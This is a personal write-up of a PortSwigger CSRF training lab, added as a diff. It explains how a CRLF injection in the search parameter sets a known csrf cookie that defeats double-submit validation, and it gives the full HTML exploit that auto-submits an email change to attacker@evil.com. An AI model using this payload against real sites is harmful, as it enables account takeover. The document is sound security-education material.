@@ -1,0 +1,49 @@
+CSRF where token is duplicated in cookie
+
+**Lab URL**: (https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie) 
+**Category**: CSRF  
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+- This lab demonstrates the weakness of the **double submit cookie pattern** when CSRF tokens are not properly tied to user sessions.
+- I learned how a **CRLF injection** vulnerability in an unprotected endpoint can be leveraged to inject arbitrary cookies into the victim’s browser.
+- This allows us to force the CSRF token to a known value (`fake`), effectively bypassing the CSRF protection.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Recon and Request Analysis
+- Logged in as `wiener:peter`.
+- Captured the POST request to `/my-account/change-email`:
+  - The request contained a CSRF token in both the cookie and the body.
+  - The server validated that `csrf` (body) === `csrf` (cookie).
+
+### 2. Finding a Cookie Injection Vector
+- Found that `/search?search=` reflects the input into a `Set-Cookie` header (via CRLF injection).
+- Used this payload:
+/?search=test%0d%0aSet-Cookie:%20csrf=fake;%20SameSite=None
+- This allows injection of a fake `csrf` cookie in the victim’s browser.
+
+### 3. Crafting the Exploit
+- Hosted an HTML exploit on the exploit server.
+- The attack flow:
+1. Load the CRLF injection URL to inject the cookie.
+2. Automatically submit a form using the fake token.
+
+### 4. Final Exploit Code
+
+```html
+<html>
+<body>
+  <form action="https://Target-Id.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com" />
+    <input type="hidden" name="csrf" value="fake" />
+  </form>
+
+  <img src="https://Target.Id.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake;%20SameSite=None" onerror="document.forms[0].submit();" />
+</body>
+</html>
